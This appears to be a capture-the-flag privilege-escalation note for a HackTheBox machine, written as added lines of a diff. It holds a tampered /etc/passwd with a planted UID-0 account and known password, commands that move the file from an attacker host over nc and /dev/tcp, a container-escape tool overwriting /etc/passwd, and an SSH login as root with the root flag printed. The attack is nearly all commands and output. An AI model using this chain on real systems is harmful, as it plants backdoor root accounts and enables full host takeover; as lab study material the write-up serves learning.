+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+saul:x:1000:1000:Saul,,,:/home/saul:/bin/bash
+oxdf:$1$FWS43Ezm$fKjubC8uKDJ9W9dmD78QP0:0:0:pwned:/root:/bin/bash
+
+please upload passwd to target machine:
+host> cat passwd | nc -lvnp 8181
+tartget> exec 3<>/dev/tcp/10.10.16.19/8181
+target> cat <&3 > passwd 
+
+command: ./shocker_write /etc/passwd passwd
+saul> ssh oxdf@127.0.0.1
+Password: 0xdf
+saul> id && whoami
+uid=0(root) gid=0(root) groups=0(root)
+root
+command: cat /root/root.txt 
+adb2e76a86338416591784a7f711454b
+
+resource:
+https://0xdf.gitlab.io/2022/08/27/htb-talkative.html
